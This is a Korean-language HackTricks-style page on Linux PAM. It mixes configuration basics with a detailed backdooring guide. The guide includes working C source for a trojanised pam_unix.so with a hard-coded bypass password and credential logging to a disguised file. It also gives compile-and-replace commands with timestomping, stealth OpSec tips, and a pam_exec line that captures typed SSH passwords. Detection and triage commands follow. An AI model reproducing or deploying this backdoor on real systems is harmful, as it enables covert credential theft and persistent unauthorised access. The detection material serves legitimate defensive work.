# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### 기본 정보

**PAM (Pluggable Authentication Modules)**은 **컴퓨터 서비스에 액세스하려는 사용자의 신원을 확인**하는 보안 메커니즘으로, 다양한 기준에 따라 해당 사용자의 액세스를 제어합니다. 이는 디지털 게이트키퍼와 유사하며, 승인된 사용자만 특정 서비스와 상호 작용할 수 있도록 보장하고 시스템 과부하를 방지하기 위해 사용량을 제한할 수도 있습니다.

#### Configuration Files

- **Solaris 및 UNIX 기반 시스템**은 일반적으로 `/etc/pam.conf`에 있는 중앙 configuration file을 사용합니다.
- **Linux 시스템**은 directory 방식을 선호하며, 서비스별 configuration을 `/etc/pam.d`에 저장합니다. 예를 들어 login service의 configuration file은 `/etc/pam.d/login`에 있습니다.

login service의 PAM configuration 예시는 다음과 같습니다:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM Management Realms**

이러한 realm 또는 management group에는 **auth**, **account**, **password**, **session**이 포함되며, 각각 authentication 및 session management 프로세스의 서로 다른 측면을 담당합니다.

- **Auth**: 사용자 identity를 검증하며, 주로 password 입력을 요청합니다.
- **Account**: account verification을 처리하고, group membership 또는 시간대별 제한과 같은 조건을 확인합니다.
- **Password**: complexity 검사 또는 dictionary attacks 방지 등 password 업데이트를 관리합니다.
- **Session**: directory mounting 또는 resource limits 설정 등 service session 시작 또는 종료 시 수행되는 작업을 관리합니다.

#### **PAM Module Controls**

Controls는 success 또는 failure에 대한 module의 response를 지정하며, 전체 authentication 프로세스에 영향을 줍니다. 다음이 포함됩니다.

- **Required**: required module이 failure하면 최종적으로 failure가 발생하지만, 이후의 모든 module을 확인한 뒤에 처리됩니다.
- **Requisite**: failure가 발생하면 프로세스를 즉시 종료합니다.
- **Sufficient**: success하면 이후 module이 failure하지 않는 한 동일 realm의 나머지 checks를 건너뜁니다.
- **Optional**: stack에 해당 module만 있는 경우에만 failure를 발생시킵니다.

#### Offensive Semantics That Matter

PAM을 backdooring할 때는 payload 자체보다 **삽입된 rule의 위치**가 더 중요한 경우가 많습니다.

- `include`와 `substack`은 다른 파일에서 rules를 가져오므로, `sshd`를 수정하면 SSH에만 영향을 줄 수 있지만 `system-auth`, `common-auth` 또는 다른 shared stack을 수정하면 여러 service에 한 번에 영향을 줄 수 있습니다.
- PAM은 `[success=1 default=ignore]`와 같은 bracketed controls도 지원합니다. 이를 악용하면 `pam_unix.so`를 눈에 띄게 교체하는 대신, custom check가 success한 후 하나 이상의 module을 **skip**할 수 있습니다.
- `module-path`는 **absolute** (`/usr/lib/security/pam_custom.so`)이거나 기본 PAM module directory에 대한 **relative** 경로일 수 있습니다. 최신 Linux 시스템에서 실제 directory는 대개 `/lib/security`, `/lib64/security`, `/usr/lib/security` 또는 `/usr/lib/x86_64-linux-gnu/security`와 같은 multiarch 경로입니다.

운영자 관점의 핵심 요점: patching하기 전에 항상 **전체 service graph**를 매핑해야 합니다. 예를 들어 일부 distro에서는 `sshd -> password-auth -> system-auth`, 다른 distro에서는 `sshd -> system-remote-login -> system-login -> system-auth`일 수 있으므로, 동일한 one-line implant가 의도보다 훨씬 넓은 범위로 확산될 수 있습니다.

#### Example Scenario

여러 auth module이 있는 setup에서는 프로세스가 엄격한 순서에 따라 진행됩니다. `pam_securetty` module이 login terminal을 unauthorized로 판단하면 root logins가 차단되지만, 해당 module의 "required" status 때문에 모든 module은 계속 처리됩니다. `pam_env`는 environment variables를 설정하여 잠재적으로 user experience를 향상시킬 수 있습니다. `pam_ldap`와 `pam_unix` module은 함께 작동하여 사용자를 authenticate하며, `pam_unix`는 이전에 제공된 password를 사용하려고 시도하므로 authentication methods의 효율성과 유연성이 향상됩니다.


## PAM Backdooring – `pam_unix.so` Hooking

high-value Linux environments에서 사용하는 classic persistence trick은 **정상적인 PAM library를 trojanised drop-in으로 교체하는 것**입니다. 모든 SSH / console login은 결국 `pam_unix.so:pam_sm_authenticate()`를 호출하므로, credentials를 capture하거나 *magic* password bypass를 구현하는 데는 몇 줄의 C 코드만 있으면 됩니다.

### Compilation Cheatsheet
<details>
<summary>Sample `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

컴파일하고 은밀하게 교체:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec 팁
1. **Atomic overwrite** – 임시 파일에 작성한 다음 `mv`로 해당 위치에 배치하여, SSH 접속을 차단할 수 있는 반쯤 작성된 library가 생성되지 않도록 합니다.
2. `/usr/bin/.dbus.log`와 같은 로그 파일 위치는 정상적인 desktop artefact와 자연스럽게 섞입니다.
3. PAM 오작동을 방지하기 위해 symbol export(`pam_sm_setcred` 등)를 동일하게 유지합니다.

### 탐지
* `pam_unix.so`의 MD5/SHA256을 distro package와 비교합니다.
* `rpm -V pam` 또는 `debsums -s libpam-modules`를 사용하면 수동 hashing 없이 교체된 library를 식별할 수 있습니다.
* `/lib/security/` 아래에서 world-writable 또는 비정상적인 ownership을 확인합니다.
* `auditd` rule: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* 예상하지 못한 module이 있는지 PAM config를 Grep합니다: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### 빠른 triage commands (post-compromise 또는 threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### 지속성을 위한 `pam_exec` 악용
`pam_unix.so`를 교체하는 대신, `/etc/pam.d/sshd`에 `pam_exec` 줄을 추가하는 더 간단한 방법을 사용할 수 있습니다. 이렇게 하면 일반적인 stack은 그대로 유지하면서 모든 SSH 로그인 시 implant가 실행됩니다:
```bash
# Run on successful auth and receive the typed password on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec`는 `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY`, `PAM_TYPE`와 같은 PAM metadata를 environment variable로 받습니다. `expose_authtok`를 사용하면 helper가 `auth` 또는 `password` phase 동안 `stdin`에서 password도 읽을 수 있습니다. helper가 real UID 대신 effective UID로 실행되도록 하려면 `seteuid`를 추가합니다.

실무 참고 사항:

- `session optional pam_exec.so ...`는 socket을 다시 열거나 detached daemon을 spawn하는 등의 **post-login actions**에 더 적합합니다.
- `auth optional pam_exec.so quiet expose_authtok ...`는 session이 열리기 전에 실행되므로 일반적으로 **credential capture**에 사용됩니다.
- `type=session` 또는 `type=auth`를 사용하면 특정 PAM phase에서만 실행되도록 제한하여 불필요한 이중 실행을 방지할 수 있습니다.

### 배포판 tooling에서 유지하기: `authselect`

RHEL, CentOS Stream, Fedora 및 derivative system에서는 `/etc/pam.d/system-auth` 또는 `/etc/pam.d/password-auth`와 같은 generated file을 직접 수정해도 **`authselect`에 의해 덮어써질 수 있습니다**. 변경 사항을 유지하려면 일반적으로 `/etc/authselect/custom/<profile>/` 아래의 active custom profile을 수정한 다음 다시 select하거나 apply합니다.

root 권한이 있을 때의 일반적인 workflow:
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Re-apply the profile after modifying the template files
authselect select custom/<profile>
```
이는 공격과 triage 모두에 중요합니다. `/etc/pam.d/system-auth`에 `Generated by authselect` 및 `Do not modify this file manually` 배너가 포함되어 있다면, 실제 persistence 지점은 `/etc/pam.d/`가 아니라 `/etc/authselect/custom/` 아래에 있을 수 있습니다.

### 실제 환경에서 확인된 최근 tradecraft

최근 2025년 보고서에 따르면 **Plague** Linux backdoor는 동일한 핵심 아이디어를 한 단계 더 발전시켰습니다. 여기에는 **static bypass password**가 포함된 악성 PAM component와, 로그인 후 session trace를 줄이기 위한 SSH 관련 environment variable 및 shell history 정리(`HISTFILE=/dev/null`)가 사용되었습니다. 이는 유용한 hunting pattern입니다. backdoor logic은 PAM에 존재하는 반면, stealth artifact는 authentication 성공 **후에만** 나타날 수 있기 때문입니다.


## References

- [pam.conf(5) / pam.d(5) - Linux-PAM Manual](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [Nextron Systems - Plague: A Newly Discovered PAM-Based Backdoor for Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)

{{#include ../../banners/hacktricks-training.md}}
